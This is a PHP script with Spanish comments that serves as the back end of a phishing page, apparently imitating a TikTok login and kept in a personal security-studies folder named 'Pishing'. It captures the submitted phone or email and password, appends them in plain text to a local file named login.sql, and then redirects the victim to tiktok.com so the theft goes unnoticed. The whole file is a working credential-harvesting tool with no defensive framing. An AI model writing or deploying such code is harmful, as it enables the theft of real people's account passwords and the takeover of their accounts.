<?php
// Verificar si los datos fueron enviados
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Obtener los datos del formulario
    $phone = $_POST['phone'];  // Capturar el teléfono o correo electrónico
    $password = $_POST['password']; // Capturar la contraseña en texto plano

    // Formatear los datos en texto plano
    $data = "Usuario: $phone, Contraseña: $password\n";

    // Ruta a la carpeta y archivo donde se guardarán los datos
    $folder = '/home/luissolis/Documentos/Seguridad_Info/Programas_Git/Pishing/sql/';
    $file = $folder . 'login.sql';

    // Verificar si la carpeta existe, si no, crearla
    if (!file_exists($folder)) {
        mkdir($folder, 0755, true); // Crear la carpeta con permisos 0755
    }

    // Guardar los datos en el archivo login.sql
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirigir al usuario a la página de TikTok
    header('Location: https://www.tiktok.com/');
    exit;
}
